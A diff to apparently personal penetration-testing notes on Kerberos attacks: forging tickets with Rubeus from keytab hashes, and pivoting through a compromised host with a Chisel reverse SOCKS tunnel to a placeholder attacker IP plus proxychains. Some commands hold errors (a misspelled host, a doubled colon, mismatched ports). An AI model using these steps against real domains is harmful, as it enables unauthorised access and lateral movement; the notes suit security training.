@@ -62,3 +62,22 @@ https://github.com/sosdave/KeyTabExtract
 - AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password. `Rubeus.exe asktgt /domain: /user /aes256: /nowrap`
 > **Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
 
+## Using Linux attack tools with Kerberos
+In case we are attacking from a machine that is not a member of the domain
+- make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.
+-  proxy our traffic via `TARGET eg MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.
+1. Host file-> `/etc/hosts`
+2. proxychains-> `/etc/proxychains.conf` 
+Socks 5 and specific port eg 1080 
+> [ProxyList]
+socks5 127.0.0.1 1080 
+3. chisel 
+```bash
+sudo ./chisel server --reverse
+```
+5. connect to the target via RDP
+6. Execute chisel 
+```powershell
+chisel.exe client atcckerip::8080 R:socks
+```
+
